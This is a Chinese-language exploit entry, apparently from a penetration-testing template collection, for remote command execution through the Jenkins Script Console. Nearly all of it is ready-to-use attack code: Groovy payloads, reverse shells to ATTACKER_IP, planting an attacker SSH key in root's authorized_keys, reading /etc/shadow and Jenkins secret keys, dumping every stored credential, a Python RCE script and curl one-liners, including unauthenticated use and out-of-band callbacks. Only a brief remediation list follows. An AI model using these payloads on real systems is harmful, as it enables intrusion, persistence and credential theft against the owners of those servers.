---
id: JENKINS-SCRIPT-CONSOLE-RCE
title: "Jenkins - Script Console Groovy RCE"
product: jenkins
vendor: Jenkins
version_affected: "All versions (requires admin credentials or misconfiguration)"
severity: CRITICAL
tags: [rce, groovy, script_console, post_auth]
fingerprint: ["Jenkins", "Dashboard [Jenkins]", "X-Jenkins"]
---

## 漏洞描述

Jenkins内置的Script Console (`/script`) 允许管理员执行任意Groovy脚本。一旦获取管理员凭据（弱口令、凭据泄露、CVE-2024-23897文件读取等），可通过Script Console直接执行系统命令实现RCE。也存在Jenkins未配置认证导致Script Console未授权可访问的情况。该功能影响所有Jenkins版本，是后渗透阶段从Jenkins管理员权限到系统命令执行的核心路径。

## 影响版本

- 所有 Jenkins 版本
- 条件: 拥有管理员凭据，或Jenkins未配置认证

## 前置条件

- 管理员凭据（或Script Console未授权可访问）
- 可访问 Jenkins `/script` 或 `/scriptText` 端点

## 利用步骤

1. 确认拥有管理员凭据（或 `/script` 返回HTTP 200未授权可访问）
2. 通过Web页面或API (`/scriptText`) 提交Groovy脚本
3. Groovy脚本在Jenkins JVM中执行，可调用Java Runtime执行系统命令

## Payload

**命令执行 (有回显)**

```groovy
// 基本命令执行
"whoami".execute().text

// 更详细的命令执行
def proc = "id".execute()
def os = new StringBuffer()
proc.waitForProcessOutput(os, os)
println os.toString()
```

**反弹Shell**

```groovy
// Linux Bash反弹Shell
"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'".execute()

// 通过Runtime数组方式(推荐，避免特殊字符问题)
["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"].execute()

// 通过Runtime类
Runtime rt = Runtime.getRuntime()
String[] commands = ["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
Process proc = rt.exec(commands)
```

**写入SSH公钥**

```groovy
def key = "ssh-rsa AAAA... attacker@kali"
def file = new File("/root/.ssh/authorized_keys")
file << key
```

**读取敏感文件**

```groovy
println new File("/etc/shadow").text
println new File("/var/jenkins_home/credentials.xml").text
println new File("/var/jenkins_home/secrets/master.key").text
```

**获取所有Jenkins凭据**

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
def creds = CredentialsProvider.lookupCredentials(
    Credentials.class, Jenkins.instance, null, null)
for (c in creds) {
    println "${c.id}: ${c.username} -> ${c.password ?: '(secret)'}"
}
```

**通过API执行Script Console**

```http
POST /scriptText HTTP/1.1
Host: <target>:8080
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Content-Type: application/x-www-form-urlencoded

script=whoami.execute().text
```

**Python Script Console RCE脚本**

```python
import requests

def script_console_rce(url, username, password, command):
    """通过Script Console执行命令"""
    url = url.rstrip("/")
    groovy = f'"{command}".execute().text'
    r = requests.post(
        f"{url}/scriptText",
        auth=(username, password),
        data={"script": groovy},
        verify=False, timeout=30
    )
    print(f"[+] Output:\n{r.text}")

# 使用: script_console_rce("http://target:8080", "admin", "password", "id")
```

**curl利用方式**

```bash
# 基础命令执行
curl -X POST "http://target:8080/script" \
  -u admin:password \
  --data-urlencode 'script=println "id".execute().text'

# 读取文件
curl -X POST "http://target:8080/script" \
  -u admin:password \
  --data-urlencode 'script=println new File("/etc/passwd").text'

# 反弹Shell
curl -X POST "http://target:8080/script" \
  -u admin:password \
  --data-urlencode 'script=["bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"].execute()'

# Windows环境
curl -X POST "http://target:8080/script" \
  -u admin:password \
  --data-urlencode 'script=println "cmd.exe /c whoami".execute().text'
```

**未授权场景 (无需-u参数)**

```bash
# 检查Script Console是否未授权可访问
curl -s -o /dev/null -w "%{http_code}" http://target:8080/script
# 返回 200 = 未授权可访问, 302/403 = 需要认证

# 未授权直接执行
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=println "id".execute().text'
```

## 验证方法

```bash
# 直接验证: 检查响应中是否包含命令输出
curl -s -X POST "http://target:8080/script" \
  -u admin:password \
  --data-urlencode 'script=println "id".execute().text' | grep "uid="
# 成功标志: 响应包含 uid=0(root) 或类似用户信息

# HTTP外带验证
curl -X POST "http://target:8080/script" \
  -u admin:password \
  --data-urlencode 'script=println "curl http://ATTACKER_IP:8888/script_rce".execute().text'

# DNS外带验证
curl -X POST "http://target:8080/script" \
  -u admin:password \
  --data-urlencode 'script=println "ping -c 1 script-rce.ATTACKER_DOMAIN".execute().text'
```

## 修复建议

1. 确保Jenkins配置了认证，禁止匿名访问
2. 启用基于矩阵的安全策略，限制Script Console访问权限
3. 使用强密码策略，避免弱口令
4. 通过反向代理限制 `/script` 和 `/scriptText` 端点的外部访问
5. 启用审计日志记录Script Console的使用情况
6. 参考: https://www.jenkins.io/doc/book/managing/script-console/
